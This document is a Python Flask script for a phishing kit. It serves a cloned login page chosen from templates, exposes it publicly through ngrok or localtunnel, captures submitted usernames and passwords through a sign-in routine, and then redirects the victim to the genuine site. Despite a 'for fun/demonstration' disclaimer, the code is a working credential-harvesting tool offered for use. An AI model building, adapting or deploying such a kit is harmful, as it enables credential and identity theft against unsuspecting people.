#!/usr/bin/env python3
import time
import threading as thr
from pyngrok import ngrok
from pagepicker.picker import page_picker
from actions.constants import (
    PUBLIC_TUNELS,
    LOAD_TIME,
    PUBLICURL,
    success,
)
from actions.actions import (
    kill_previous_connection,
    create_initial_files,
    request_localhost,
    push_page_options,
    redirect_setter,
    clear_terminal,
    connect_ngrok,
    status_bar,
    sign_in,
    banner,
)
from flask import (
    render_template,
    redirect,
    request,
    Flask,
)
from flask_lt import run_with_lt


"""
                ~ DISCLAIMER ~
This software is made purely for fun/demonstating purposes
and should NOT in any way be used illegally and without
EXPLICIT permission. Any use of this application that does
not follow the aforementioned rules may face
serious legal consequences for credential/identity theft.
Any user may also need to see the regulations that apply to his country:

https://en.wikipedia.org/wiki/Cyber-security_regulation

I, and from now on, as the author of this software, am not to be
be held responsible for any misuse nor any illegal activities.
Each user is solely responsible and accountable for his own actions.
"""


clear_terminal()
port = '5000'
create_initial_files()
kill_previous_connection()


print(banner())
app = Flask(__name__)

page = page_picker()
push_page, host = push_page_options(port)

page_name = page.create()
redirect_setter(page_name)


# SENDING THE FAKE `GET` REQUEST AND PRINTING THE STATUS BAR
# IN SEPERATE THREADS FOR SMOOTH FLOW AND AVOID FREEZING
if push_page in PUBLIC_TUNELS:
    if push_page == 'localtunnel':
        time.sleep(8)
        run_with_lt(app)
    timer = thr.Timer(LOAD_TIME, request_localhost, args=(host, port))
    timer.start()
    bar = thr.Thread(target=status_bar, args=(LOAD_TIME,))
    bar.start()


@app.route('/', methods=['POST', 'GET'])
def main():
    name = request.form.get('name')
    passwd = request.form.get('password')
    
    if push_page == 'ngrok':
        connect_ngrok(port)
    
    if name is not None:
        if len(name) and len(passwd):
            sign_in(name, passwd, page_name.title())
            return redirect(f'https://www.{page_name}.com/')
    return render_template(f"{page_name}.html")


if __name__ == '__main__':
    clear_terminal()
    print(success(f"Your are currently running at: {push_page} mode"))
    print(success(f"Access point: {host}:{port}"))
    app.run(host=host, port=port)

ngrok.disconnect(PUBLICURL)
